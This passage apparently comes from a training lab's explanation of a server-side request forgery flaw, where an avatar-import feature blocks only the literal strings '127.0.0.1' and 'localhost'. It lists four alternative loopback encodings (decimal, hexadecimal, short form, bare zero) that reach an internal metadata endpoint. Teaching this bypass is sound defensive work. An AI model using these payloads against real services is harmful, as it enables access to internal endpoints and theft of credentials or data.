This "import your avatar from a URL" feature checks the submitted URL's host against a blocklist before fetching it -- but the check only recognizes the exact strings 127.0.0.1 and localhost. Any other way of writing the same address sails straight through.

{% endblock %} {% block detect %}

Submitting http://127.0.0.1:5000/a10/internal/metadata directly is correctly rejected. The blocklist looks like it works -- until you write the same address a different way.

{% endblock %} {% block exploitation %}

Any of these reach the exact same address the blocklist just refused:

  • http://2130706433:5000/a10/internal/metadata (decimal)
  • http://0x7f000001:5000/a10/internal/metadata (hexadecimal)
  • http://127.1:5000/a10/internal/metadata (short form)
  • http://0:5000/a10/internal/metadata (bare zero -- Linux treats this as "any address," which routes to loopback for an outbound connection)

None of these strings contain 127.0.0.1 or localhost, so the blocklist never even looks at them twice.
